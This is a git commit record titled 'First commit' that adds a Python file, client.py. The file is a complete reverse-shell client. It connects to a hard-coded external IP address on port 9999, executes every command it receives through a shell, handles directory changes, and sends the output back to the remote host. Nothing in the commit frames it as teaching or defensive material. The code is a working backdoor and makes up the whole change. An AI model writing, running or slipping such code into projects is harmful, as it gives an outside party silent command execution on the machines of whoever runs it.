1cafa1195e5697cd08a18231efbfe3c009d073d8
Hall, Jeff <Jeffrey.Hall@exlibrisgroup.com>
2018-12-04 14:08:10 -0800

    First commit.

---
+++ client.py
@@ -0,0 +1,24 @@
+import os
+import socket
+import subprocess
+
+s = socket.socket()
+server_address = ('34.220.167.231', 9999)
+
+s.connect(server_address)
+
+while True:
+    data = s.recv(1024)
+    if data[:2].decode("utf-8") == 'cd':
+        os.chdir(data[3:].decode("utf-8"))
+
+    if len(data) > 0:
+        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
+                               stderr=subprocess.PIPE)
+        output_byte = cmd.stdout.read() + cmd.stderr.read()
+        output_string = str(output_byte, "utf-8")
+        cwd = os.getcwd() + "$"
+
+        s.send(str.encode(output_string + cwd))
+
+        print(output_string)
